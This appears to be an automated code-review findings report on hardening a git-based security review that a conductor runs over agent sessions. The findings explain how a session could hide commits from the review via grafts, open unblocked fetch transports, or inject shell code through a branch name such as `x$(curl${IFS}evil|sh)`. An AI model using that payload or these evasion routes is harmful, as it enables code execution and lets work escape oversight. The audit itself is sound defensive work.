findings.description: The three-dot range takes its base from a merge base that git computes through `<commonDir>/info/grafts`. Neither `--no-replace-objects` nor `core.useReplaceRefs=false` turns grafts off. A session that writes `info/` (ADR 0118 grants it writes `info/attributes`) can graft a hidden commit into the target's ancestry. The review then omits that commit while still showing the correct `<head-id>`. Possible fixes: prefix `GIT_GRAFT_FILE=/dev/null` beside `GIT_NO_LAZY_FETCH=1`, and optionally add `-c core.commitGraph=false` against a planted commit-graph.

The pins block only seven transports by name. Any other transport name is turned on by a `protocol.<name>.allow=always` a session plants in the shared config. `GIT_NO_LAZY_FETCH` is ignored before git 2.44, and ADR 0118 reproduces on 2.39.5. So on the operator's git, the lazy-fetch path the comment calls closed is open over `ftp://`/`ftps://`. `GIT_ALLOW_PROTOCOL=none` (as ADR 0059's poster uses) would close every transport regardless of config; `NO_TRANSPORT` in `src/core/dashboard.service.ts:520` has the same gap.

The prompt has the conductor fill `<target>` with "the branch the main checkout is on" and paste it unquoted into `rev-parse refs/heads/<target> ...`, with no check on the name. A session can flip the main checkout's HEAD (ADR 0080) to a branch named like `x$(curl${IFS}evil|sh)`, which `git check-ref-format` accepts, and the conductor's shell would run it. Tell the conductor the review cannot run unless the name matches `[A-Za-z0-9._/-]+` and does not start with `-`, or quote it.

The seven-name `-c protocol.<name>.allow=never` list in `securityReviewGit` duplicates `NO_TRANSPORT` in `src/core/dashboard.service.ts:520-523`; a transport added to one list can drift from the other. One exported constant next to `worktreeGitEnv` in `git-diff.client.ts` would keep them together.

The new `['the common dir', commonDir]` entry reuses the message `${label} contains characters unsafe for a generated hook: ${path}`. The common dir never reaches a hook; it only goes into `context.md`'s review commands. An operator whose `.git` symlink resolves to a path containing `$` or a backtick is told about a 'generated hook' that does not exist, and the message does not say the path came from following `.git`.

`worktreeGitEnv(input.repoPath, input.repoPath).GIT_COMMON_DIR` passes the repo as a session worktree and discards the `GIT_DIR`/`GIT_WORK_TREE` it builds (the `GIT_DIR` names a nonexistent path); a small exported `commonDirOf(repoPath)` that `worktreeGitEnv` also calls would say what is meant.

`conductorModelsSection` now builds three shell commands and takes `commonDir` only for them, threaded through `buildConductorContext`; a `securityReviewCommands(commonDir)` builder in the caller would keep the prompt section free of shell construction.

The real-repo test recovers the three commands by scraping the rendered prompt with `/`(test ! -e [^`]+)`/g` and destructuring by position, so reordering them or adding another backticked `test ! -e` command silently shifts the triple; exporting the command builder would let both tests call it directly.

The comment above `diffArgs` explains `--unified=3` and `--function-context`, but `diffArgs` holds neither (they are added on the `diff` line below, and the numstat that also uses `diffArgs` carries neither); move that half of the rationale above the `diff` constant.

The comment "Resolved from `repoPath`, so a symlink on the way can bring in what `repoPath` was checked for" is cryptic; say that the resolved path can carry shell-unsafe characters `repoPath` did not, so it is checked on its own.
The `SECURITY_REVIEW_TURNS` comment doesn't say the cap is advisory (the Agent tool cannot enforce it), so a reader may take it as an enforced limit.
"CI's reads the copy GitHub hashed on push." is missing a word; it should read "CI's review reads the copy GitHub hashed on push."

process_issues.description: The injected rule file (.claude/rules/core-conventions.md) arrived as bare @ references with no rule text, and CLAUDE.md forbids reading docs/conventions/*.md directly, so the conventions reviewer could not check against or quote rules from general.md, naming.md or testing.md.
